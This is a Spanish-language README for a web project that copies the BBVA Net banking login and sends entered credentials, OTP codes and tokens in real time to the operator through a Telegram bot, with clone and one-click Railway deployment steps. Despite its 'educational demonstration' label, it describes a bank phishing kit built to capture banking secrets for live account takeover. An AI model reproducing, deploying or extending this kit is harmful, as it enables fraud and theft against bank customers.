# BBVA Net Clone con Integración Telegram

Aplicación web que replica la interfaz de BBVA Net con integración a Telegram mediante Socket.io.

## 🚀 Características

- Interfaz de usuario moderna que replica BBVA Net
- Integración en tiempo real con Telegram Bot
- Validación de credenciales, OTP y Token
- Panel de administración desde Telegram
- Arquitectura cliente-servidor con WebSockets

## 📋 Requisitos

- Node.js 14 o superior
- Cuenta de Telegram Bot
- Chat ID de Telegram

## 🛠️ Instalación Local

1. Clona el repositorio:
```bash
git clone https://github.com/hanselrosales255/bbva-gol.git
cd bbva-gol
```

2. Instala las dependencias:
```bash
npm install
```

3. Configura las variables de entorno (opcional, ver Configuración):
```bash
# Crea un archivo .env con tus credenciales
TELEGRAM_BOT_TOKEN=tu_token_aqui
TELEGRAM_CHAT_ID=tu_chat_id_aqui
PORT=3000
```

4. Inicia el servidor:
```bash
npm start
```

5. Abre tu navegador en `http://localhost:3000`

## ⚙️ Configuración

El proyecto puede funcionar con credenciales hardcodeadas o con variables de entorno:

### Variables de Entorno (Recomendado para producción)

- `TELEGRAM_BOT_TOKEN`: Token de tu bot de Telegram
- `TELEGRAM_CHAT_ID`: ID del chat donde recibirás las notificaciones
- `PORT`: Puerto del servidor (Railway lo asigna automáticamente)

## 🚂 Despliegue en Railway

1. Haz fork o clona este repositorio
2. Ve a [Railway.app](https://railway.app)
3. Click en "New Project" → "Deploy from GitHub repo"
4. Selecciona este repositorio
5. (Opcional) Agrega las variables de entorno en la configuración del proyecto:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
6. Railway desplegará automáticamente la aplicación

El proyecto está configurado para funcionar automáticamente en Railway sin configuración adicional.

## 📦 Estructura del Proyecto

```
bbva-gol/
├── server.js           # Servidor Express y Socket.io
├── index.html          # Página de login
├── otp.html           # Página de validación OTP
├── token.html         # Página de validación Token
├── styles.css         # Estilos globales
├── package.json       # Dependencias
└── img/              # Recursos de imagen
```

## 🔧 Scripts Disponibles

- `npm start`: Inicia el servidor en producción
- `npm run dev`: Inicia el servidor en modo desarrollo con nodemon

## 🤝 Tecnologías

- **Backend**: Node.js, Express.js
- **WebSockets**: Socket.io
- **API**: Axios para integración con Telegram
- **Frontend**: HTML, CSS, JavaScript vanilla

## 📝 Licencia

ISC

## 👤 Autor

Desarrollado con ❤️ para demostración educativa
